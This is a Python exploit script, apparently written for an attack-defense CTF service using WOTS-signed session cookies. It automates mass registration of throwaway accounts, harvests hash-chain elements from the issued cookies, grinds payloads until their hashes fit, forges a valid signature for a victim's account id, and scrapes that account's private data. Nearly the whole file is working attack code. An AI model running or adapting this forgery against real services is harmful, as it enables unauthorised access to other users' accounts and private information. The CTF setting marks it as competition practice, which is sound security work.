"""Exploit for the WOTS-cookie service (Student CTF 2024 — assumed 'secretscribble';
rename/remap in config if it is actually another service).

Vulnerability: the session cookie (header.payload.signature) is signed with a
Winternitz one-time signature (WOTS) that is (a) reused with ONE global key for
every cookie and (b) has NO checksum. Each issued cookie reveals hash-chain
elements; after collecting enough, for each of the 32 message-hash bytes we know
a chain element at the maximum value seen. We can then sign ANY message whose
sha256 bytes are all <= those per-position maxima (just hash the chain forward).
Forge a cookie carrying the victim's cabinet id -> /cabinet/<id>/ reveals their
private info (the flag).

Interface: exploit(host, port, flag_id) -> list[str]     # flag_id = victim cabinet id
Deps: requests (stdlib otherwise). No checklib dependency.
"""
import json
import random
import re
import string
import sys
from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
from hashlib import sha256

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 8
N_USERS = 30
HEADER = json.dumps({"type": "WOTS"}).encode()

# global WOTS key is static for the whole game -> cache the revealed chain maxima
# per target so we register 30 users once per box, not once per flag.
_CACHE = {}


def _h(b):
    return sha256(b).digest()


def _rnd(n=12):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


def _register(url):
    s = requests.Session()
    for _ in range(6):
        try:
            r = s.post(url + "/sign", data={"username": _rnd(), "password": _rnd(16)}, timeout=TIMEOUT)
        except Exception:
            return None, None
        if "уже есть" in r.text:            # username taken -> retry
            continue
        uid = r.url.rstrip("/").split("/")[-1]
        return s, uid
    return None, None


def _read_username(s, url, uid):
    try:
        r = s.get("%s/cabinet/%s/" % (url, uid), timeout=TIMEOUT)
        m = re.findall(r"Username : <b>(.*?)</b>", r.text)
        return m[0] if m else None
    except Exception:
        return None


def _collect(url):
    maxes = [-1] * 32
    max_sig = [b""] * 32
    sess = None
    got = 0
    for _ in range(N_USERS):
        s, uid = _register(url)
        if not s:
            continue
        if sess is None:
            sess = s
        cookie = s.cookies.get("session")
        if not cookie or cookie.count(".") < 2:
            continue
        try:
            payload = b64d(cookie.split(".")[1])
            sig = b64d(cookie.split(".")[2])
        except Exception:
            continue
        chunks = [sig[i:i + 32] for i in range(0, len(sig), 32)]
        if len(chunks) < 32:
            continue
        hd = _h(payload)
        for i in range(32):
            if hd[i] > maxes[i]:
                maxes[i] = hd[i]
                max_sig[i] = chunks[i]
        got += 1
    return maxes, max_sig, sess, got


def _forge_sig(msg_hash, maxes, max_sig):
    out = []
    for i in range(32):
        v = max_sig[i]
        for _ in range(maxes[i] - msg_hash[i]):   # hash the chain forward to the lower value
            v = _h(v)
        out.append(v)
    return b"".join(out)


def exploit(host, port, flag_id):
    url = "http://%s:%d" % (host, port)
    key = (host, port)
    if key not in _CACHE or _CACHE[key][3] == 0:
        _CACHE[key] = _collect(url)
    maxes, max_sig, sess, got = _CACHE[key]
    if got == 0 or min(maxes) < 0:
        return []

    vid = str(flag_id).strip() if flag_id is not None else None
    if vid is None:
        return []
    uname = _read_username(sess, url, vid) if sess else None

    base = {"id": int(vid) if vid.lstrip("-").isdigit() else vid,
            "username": uname if uname is not None else _rnd()}
    for attempt in range(50000):
        data = dict(base)
        if attempt:
            data["e"] = _rnd(10)        # grind a filler field until all hash bytes <= maxes
        payload = json.dumps(data).encode()
        hd = _h(payload)
        if all(hd[i] <= maxes[i] for i in range(32)):
            sig = _forge_sig(hd, maxes, max_sig)
            cookie = ".".join([b64e(HEADER).decode(), b64e(payload).decode(), b64e(sig).decode()])
            try:
                r = requests.get("%s/cabinet/%s/" % (url, vid), cookies={"session": cookie}, timeout=TIMEOUT)
            except Exception:
                return []
            return list(dict.fromkeys(FLAG_RE.findall(r.text)))
    return []


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 5005
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
